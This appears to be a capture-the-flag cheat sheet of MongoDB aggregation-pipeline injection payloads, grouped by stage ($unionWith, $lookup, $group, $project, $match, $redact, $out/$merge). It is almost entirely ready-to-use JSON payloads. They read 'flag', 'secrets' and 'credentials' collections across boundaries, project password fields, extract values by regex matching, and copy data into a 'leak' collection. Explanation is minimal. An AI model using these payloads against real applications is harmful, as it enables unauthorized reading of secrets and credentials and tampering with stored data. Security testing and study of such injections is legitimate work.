# Aggregation deep — the pipeline's full surface

## The array-body — the pipeline-injection

```json
[{"$unionWith": "flag"}]
[{"$lookup": {"from": "flag", "localField": "x", "foreignField": "y", "as": "f"}}]
[{"$project": {"flag": 1}}]
[{"$match": {"flag": {"$regex": "^a"}}}]
[{"$group": {"_id": null, "f": {"$first": "$flag"}}}]
[{"$sort": {"flag": 1}}]
[{"$limit": 1}]
[{"$skip": 0}]
[{"$count": "n"}]
[{"$facet": {"a": [{"$match": {}}]}}]
[{"$bucket": {"groupBy": "$p", "boundaries": [0, 10]}}]
[{"$bucketAuto": {"groupBy": "$p", "buckets": 2}}]
[{"$sortByCount": "$u"}]
[{"$set": {"flag": "$flag"}}]
[{"$unset": "secret"}]
[{"$addFields": {"f": "$flag"}}]
[{"$replaceRoot": {"newRoot": "$doc"}}]
[{"$replaceWith": "$doc"}]
[{"$redact": {"$cond": {"if": {"$eq": ["$u", "admin"]}, "then": "$$KEEP", "else": "$$PRUNE"}}}]
[{"$out": "leak"}]
[{"$merge": {"into": "leak"}}]
```

`aggregation.md` — the array-body's surface.

## `$unionWith` — the cross-collection

```json
[{"$unionWith": "flag"}]
[{"$unionWith": {"coll": "flag", "pipeline": [{"$match": {"flag": {"$regex": "^a"}}}]}}]
[{"$unionWith": "secrets"}]
[{"$unionWith": "credentials"}]
```

`$unionWith` — joins another collection's docs — the flag-collection
leak — `aggregation.md`.

## `$lookup` — the join

```json
[{"$lookup": {"from": "flag", "localField": "x", "foreignField": "y", "as": "f"}}]
[{"$lookup": {"from": "secrets", "let": {"id": "$_id"}, "pipeline": [{"$match": {"$expr": {"$eq": ["$uid", "$$id"]}}}], "as": "s"}}]
```

`$lookup` — the classic join — `aggregation.md`.

## `$graphLookup` — the recursive-join

```json
[{"$graphLookup": {"from": "users", "startWith": "$uid", "connectFromField": "uid", "connectToField": "_id", "as": "chain"}}]
```

`extended-corpus.md`.

## `$group` — the aggregate

```json
[{"$group": {"_id": null, "f": {"$first": "$flag"}}}]
[{"$group": {"_id": null, "f": {"$last": "$flag"}}}]
[{"$group": {"_id": "$u", "n": {"$sum": 1}}}]
[{"$group": {"_id": null, "f": {"$push": "$flag"}}}]
[{"$group": {"_id": null, "f": {"$addToSet": "$flag"}}}]
[{"$group": {"_id": null, "f": {"$max": "$p"}}}]
[{"$group": {"_id": null, "f": {"$min": "$p"}}}]
[{"$group": {"_id": null, "f": {"$avg": "$p"}}}]
[{"$group": {"_id": null, "f": {"$stdDevPop": "$p"}}}]
[{"$group": {"_id": null, "f": {"$stdDevSamp": "$p"}}}]
```

`$group` — `aggregation.md`.

## `$project` — the projection

```json
[{"$project": {"flag": 1}}]
[{"$project": {"_id": 0, "flag": 1}}]
[{"$project": {"flag": 1, "pass": 1}}]
[{"$project": {"x": {"$concat": ["$a", "$b"]}}}]
[{"$project": {"x": {"$substrCP": ["$p", 0, 4]}}}]
[{"$project": {"x": {"$toUpper": "$p"}}}]
[{"$project": {"x": {"$split": ["$p", ","]}}}]
```

`$project` — `aggregation.md`.

## `$match` — the filter-stage

```json
[{"$match": {"flag": {"$regex": "^a"}}}]
[{"$match": {"user": {"$ne": null}}}]
[{"$match": {"pass": {"$gt": "m"}}}]
[{"$match": {"$expr": {"$eq": [{"$substrCP": ["$p", 0, 4]}, "flag"]}}}]
```

`$match` — `aggregation.md`.

## `$redact` — the keep/prune

```json
[{"$redact": {"$cond": {"if": {"$eq": ["$u", "admin"]}, "then": "$$KEEP", "else": "$$PRUNE"}}}]
[{"$redact": {"$cond": {"if": {"$gt": ["$level", 3]}, "then": "$$DESCEND", "else": "$$PRUNE"}}}]
```

`$redact` — `aggregation.md`.

## `$out`/`$merge` — the write-stages

```json
[{"$out": "leak"}]
[{"$merge": {"into": "leak"}}]
[{"$merge": {"into": {"db": "x", "coll": "y"}, "on": "_id", "whenMatched": "replace"}}]
```

`$out`/`$merge` — write-permission required — `denied-conditions.md`.

## The `aggregate` + `find` — the cross-read

```javascript
db.collection('u').aggregate([{"$unionWith": "flag"}])
db.collection('u').find({$or: [...]}).toArray()
```

`aggregation.md`.
